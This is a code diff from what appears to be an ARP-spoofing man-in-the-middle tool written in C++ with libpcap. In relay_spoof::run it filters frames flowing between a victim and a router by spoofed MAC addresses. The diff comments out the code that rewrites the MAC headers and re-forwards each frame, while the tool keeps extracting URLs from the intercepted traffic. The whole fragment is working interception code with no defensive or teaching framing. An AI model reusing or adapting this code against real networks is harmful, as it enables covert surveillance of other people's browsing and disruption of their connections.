@@ -50,13 +50,14 @@ void relay_spoof::run() {
             eth = (struct libnet_ethernet_hdr *)packet;
 
             if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) == 1 && flag_check_get(eth->ether_shost, spoofVictimMac) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
-                for(i = 0; i < ETHER_ADDR_LEN; i++) {
+/*                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                     *(packet + i) = *(spoofRouterMac + i);
                     *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                 }
                 pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 //                printf("\n##### Host Get Packet #####\n");
 //                get_print_packet(pkthdr->len, packet);
+*/
                 getUrl(packet, pkthdr->len);
                 if(get_broad_cnt != test_cnt) {
                     emit relay_urlList(relay_url_list);
@@ -64,13 +65,14 @@ void relay_spoof::run() {
                 }
             }
             if(flag_check_get(eth->ether_dhost, spoofAtkMac) != 1 && flag_check_get(eth->ether_shost, spoofRouterMac) != 1 && flag_check_get(eth->ether_shost, spoofVictimMac) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
-                for(i = 0; i < ETHER_ADDR_LEN; i++) {
+/*                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                     *(packet + i) = *(spoofVictimMac + i);
                     *(packet + ETHER_ADDR_LEN + i) = *(spoofAtkMac + i);
                 }
                 pcap_sendpacket(spoofPcap, packet, pkthdr->len);
 //                printf("\n##### DNS Packet #####\n");
 //                get_print_packet(length, packet);
+*/
                 sendUrl(packet, pkthdr->len);
             }
         }
